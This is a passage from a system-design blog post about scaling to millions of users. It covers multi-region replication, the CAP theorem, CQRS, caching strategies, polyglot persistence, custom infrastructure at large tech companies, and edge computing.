https://substackcdn.com/image/fetch/$s_!96qq!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 848w, https://substackcdn.com/image/fetch/$s_!96qq!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 1272w, https://substackcdn.com/image/fetch/$s_!96qq!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!96qq!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png" width="1456" height="562" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:562,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:160705,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!96qq!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 424w, https://substackcdn.com/image/fetch/$s_!96qq!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 848w, https://substackcdn.com/image/fetch/$s_!96qq!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 1272w, https://substackcdn.com/image/fetch/$s_!96qq!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>There are two main approaches:</p><p>One region (primary) handles all writes. Other regions serve reads and can take over if the primary fails.</p><p><strong>Pros:</strong></p><ul><li><p>Simpler to implement</p></li><li><p>No write conflict resolution needed</p></li><li><p>Strong consistency for writes</p></li></ul><p><strong>Cons:</strong></p><ul><li><p>Higher write latency for users far from primary</p></li><li><p>Failover isn’t instantaneous (DNS propagation, replica promotion)</p></li><li><p>Primary region is still a single point of failure</p></li></ul><p>All regions handle both reads and writes. This requires solving the hard problem: what happens when users in US and EU update the same record simultaneously?</p><p><strong>Pros:</strong></p><ul><li><p>Lowest possible latency for all operations</p></li><li><p>True high availability, any region failure is seamless</p></li><li><p>No single point of failure</p></li></ul><p><strong>Cons:</strong></p><ul><li><p>Conflict resolution is complex (and can cause data issues if done wrong)</p></li><li><p>Eventually consistent, not suitable for all data types</p></li><li><p>More complex to reason about and debug</p></li></ul><p>Most companies start with active-passive. Active-active requires solving distributed consensus problems and accepting eventual consistency.</p><p>The CAP theorem becomes very real at global scale. It states that a distributed system can only provide two of three guarantees:</p><ul><li><p><strong>Consistency</strong><span>: Every read receives the most recent write</span></p></li><li><p><strong>Availability</strong><span>: Every request receives a response (not an error)</span></p></li><li><p><strong>Partition Tolerance</strong><span>: System continues despite network partitions</span></p></li></ul><p>Since network partitions between regions are inevitable (undersea cables get cut, cloud providers have outages), you’re really choosing between consistency and availability during a partition.</p><p><span>Most global systems choose </span><strong>eventual consistency</strong><span> for most operations:</span></p><ul><li><p>A user’s post might take 1-2 seconds to appear for followers in other regions</p></li><li><p>A product rating might show slightly different averages in different regions briefly</p></li><li><p>User profile updates might take a moment to propagate</p></li></ul><p>Only operations where inconsistency causes real problems (payments, inventory decrements, financial transactions) require strong consistency, and those might route to a primary region.</p><p>As systems grow, read and write patterns diverge significantly:</p><ul><li><p>Writes need transactions, validation, normalized data, audit logs</p></li><li><p>Reads need denormalized data, fast aggregations, full-text search</p></li><li><p>Write volume might be 1/100th of read volume</p></li></ul><p><strong>CQRS (Command Query Responsibility Segregation)</strong><span> separates these concerns entirely.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!1L23!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!1L23!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 424w, https://substackcdn.com/image/fetch/$s_!1L23!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 848w, https://substackcdn.com/image/fetch/$s_!1L23!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 1272w, https://substackcdn.com/image/fetch/$s_!1L23!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!1L23!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png" width="990" height="822" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:822,&quot;width&quot;:990,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:89279,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!1L23!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 424w, https://substackcdn.com/image/fetch/$s_!1L23!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 848w, https://substackcdn.com/image/fetch/$s_!1L23!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 1272w, https://substackcdn.com/image/fetch/$s_!1L23!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7ebf5186-dcd2-43f8-ae84-4b0dd89cc97e_990x822.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The write side uses a normalized schema optimized for data integrity and transactional guarantees. The read side uses denormalized views optimized for query performance. Events synchronize the two.</p><p>Real-world example: Twitter’s timeline architecture.</p><ul><li><p><strong>Write path</strong><span>: When you tweet, it’s written to a normalized tweets table with proper indexing, constraints, and transactions.</span></p></li><li><p><strong>Event</strong><span>: A “tweet created” event fires.</span></p></li><li><p><strong>Projection</strong><span>: A fan-out service reads the event and adds the tweet to each follower’s timeline (a denormalized, per-user data structure optimized for “show me my feed” queries).</span></p></li><li><p><strong>Read path</strong><span>: When you open Twitter, you read from your pre-computed timeline, not a complex query joining tweets, follows, and users.</span></p></li></ul><p>CQRS adds complexity but enables:</p><ul><li><p>Independent scaling of read and write paths</p></li><li><p>Optimized schemas for each access pattern</p></li><li><p>Different technology choices (PostgreSQL for writes, Elasticsearch for reads)</p></li><li><p>Better performance for both operations</p></li></ul><p>At global scale, caching becomes more sophisticated:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!NmDL!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!NmDL!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 424w, https://substackcdn.com/image/fetch/$s_!NmDL!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 848w, https://substackcdn.com/image/fetch/$s_!NmDL!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 1272w, https://substackcdn.com/image/fetch/$s_!NmDL!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!NmDL!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png" width="1456" height="142" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/fa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:142,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:75674,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!NmDL!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 424w, https://substackcdn.com/image/fetch/$s_!NmDL!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 848w, https://substackcdn.com/image/fetch/$s_!NmDL!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 1272w, https://substackcdn.com/image/fetch/$s_!NmDL!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffa52d751-9fb2-4ec5-8329-d7e60e0f1273_2638x258.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!I6Fh!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!I6Fh!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 424w, https://substackcdn.com/image/fetch/$s_!I6Fh!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 848w, https://substackcdn.com/image/fetch/$s_!I6Fh!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 1272w, https://substackcdn.com/image/fetch/$s_!I6Fh!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!I6Fh!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png" width="707" height="241" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:241,&quot;width&quot;:707,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:37499,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!I6Fh!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 424w, https://substackcdn.com/image/fetch/$s_!I6Fh!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 848w, https://substackcdn.com/image/fetch/$s_!I6Fh!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 1272w, https://substackcdn.com/image/fetch/$s_!I6Fh!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3bb11c6-5f8b-4deb-9a91-2151737002d4_707x241.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>When a new cache server starts (or cache expires after maintenance), the first requests face cache misses, causing latency spikes and origin load. Cache warming pre-populates caches before traffic arrives:</p><ul><li><p><strong>On deployment</strong><span>: Load popular items into cache during startup, before receiving traffic</span></p></li><li><p><strong>Before campaigns</strong><span>: Before a marketing push, warm caches with products/pages likely to be accessed</span></p></li><li><p><strong>Cache replication</strong><span>: When adding a new cache node, copy state from existing nodes</span></p></li></ul><blockquote><p>Netflix pre-warms edge caches with popular content before peak hours. When evening viewing starts, the most-watched shows are already cached at edge locations.</p></blockquote><p>For write-heavy workloads, write to cache first and asynchronously persist to database:</p><ol><li><p>Write goes to cache (immediate return to user)</p></li><li><p>Cache acknowledges write</p></li><li><p>Background process flushes writes to database periodically</p></li></ol><p>This reduces write latency dramatically but introduces risk: if the cache fails before flushing, writes are lost. Use only when:</p><ul><li><p>Some data loss is acceptable (analytics counters, view counts)</p></li><li><p>Cache is highly available (Redis with replication and persistence)</p></li><li><p>Durability can be sacrificed for performance</p></li></ul><p>You’ve now built a globally distributed system that handles millions of users with low latency worldwide. But the journey doesn’t end here. At truly massive scale, even the best off-the-shelf solutions start showing their limits.</p><p>At 10 million users and beyond, you enter territory where off-the-shelf solutions don’t always work. Companies at this scale often build custom infrastructure tailored to their specific access patterns. The problems become unique to your workload.</p><p>No single database handles all access patterns well. The concept of “polyglot persistence” means using different databases for different use cases:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!iUBY!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!iUBY!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 424w, https://substackcdn.com/image/fetch/$s_!iUBY!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 848w, https://substackcdn.com/image/fetch/$s_!iUBY!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 1272w, https://substackcdn.com/image/fetch/$s_!iUBY!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!iUBY!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png" width="1456" height="284" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:284,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:161009,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!iUBY!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 424w, https://substackcdn.com/image/fetch/$s_!iUBY!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 848w, https://substackcdn.com/image/fetch/$s_!iUBY!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 1272w, https://substackcdn.com/image/fetch/$s_!iUBY!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c4f0ecf-ea50-43b9-9667-2fb913c79fdd_2974x580.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!I1yF!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!I1yF!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 424w, https://substackcdn.com/image/fetch/$s_!I1yF!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 848w, https://substackcdn.com/image/fetch/$s_!I1yF!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 1272w, https://substackcdn.com/image/fetch/$s_!I1yF!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!I1yF!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png" width="707" height="423" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/dd6a7801-af9d-46a7-897b-308a7015b623_707x423.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:423,&quot;width&quot;:707,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:85031,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!I1yF!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 424w, https://substackcdn.com/image/fetch/$s_!I1yF!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 848w, https://substackcdn.com/image/fetch/$s_!I1yF!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 1272w, https://substackcdn.com/image/fetch/$s_!I1yF!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd6a7801-af9d-46a7-897b-308a7015b623_707x423.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Each database is optimized for specific access patterns. Using PostgreSQL for time-series data works but is inefficient. Using Elasticsearch for transactions is possible but dangerous.</p><p>At extreme scale, some companies build custom infrastructure because their requirements go beyond what general-purpose systems can deliver:</p><ul><li><p><strong>Facebook’s TAO:</strong><span> A custom data system for the social graph, built to meet Facebook’s latency and throughput needs at massive scale when off-the-shelf options couldn’t.</span></p></li><li><p><strong>Google Spanner:</strong><span> A globally distributed SQL database designed to provide strong consistency across regions, combining properties that were hard to get together at the time.</span></p></li><li><p><strong>Netflix’s EVCache:</strong><span> A large-scale caching layer built on Memcached, with additional replication, reliability, and operational tooling to support Netflix’s traffic patterns.</span></p></li><li><p><strong>Discord’s storage journey:</strong><span> MongoDB (2015) → Cassandra (2017) → ScyllaDB (2022). Each move was driven by the limits of the previous choice, and Discord has shared detailed write-ups on the trade-offs behind those migrations.</span></p></li><li><p><strong>Uber’s Schemaless:</strong><span> A MySQL-based storage layer designed to keep transactional semantics while scaling beyond a single MySQL setup, with operational simplicity for teams.</span></p></li></ul><p>These aren’t options you’ll reach for initially, but they illustrate that scaling is an ongoing journey, not a destination. The architecture that works at 1 million users is rarely the one you’ll want at 100 million.</p><p>The next frontier is pushing computation closer to users. Instead of all logic running in centralized data centers, edge computing runs code at CDN edge locations worldwide:</p><ul><li><p><strong>Cloudflare Workers</strong><span>: JavaScript/WASM at 250+ edge locations</span></p></li><li><p><strong>AWS Lambda@Edge</strong><span>: Lambda functions at CloudFront edge</span></p></li><li><p><strong>Fastly Compute@Edge</strong><span>: Compute at Fastly’s edge network</span></p></li><li><p><strong>Deno Deploy</strong><span>: Globally distributed JavaScript runtime</span></p></li></ul><p>Edge computing represents a fundamental shift: instead of “request → CDN → origin → CDN → response”, many requests become “request → edge → response” with the edge having enough compute capability to handle the logic.</p><p>Now that we’ve covered the full progression from a single server to global-scale infrastructure, an important question remains: how do you know when to take each step? Scaling too early wastes resources; scaling too late causes outages.</p><p>Scaling a system from zero to millions of users follows a predictable progression. Each stage solves problems that emerge at specific thresholds:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!tfJp!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720aa4eb-2654-4e95-a50c-41aba07af610_705x350.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" 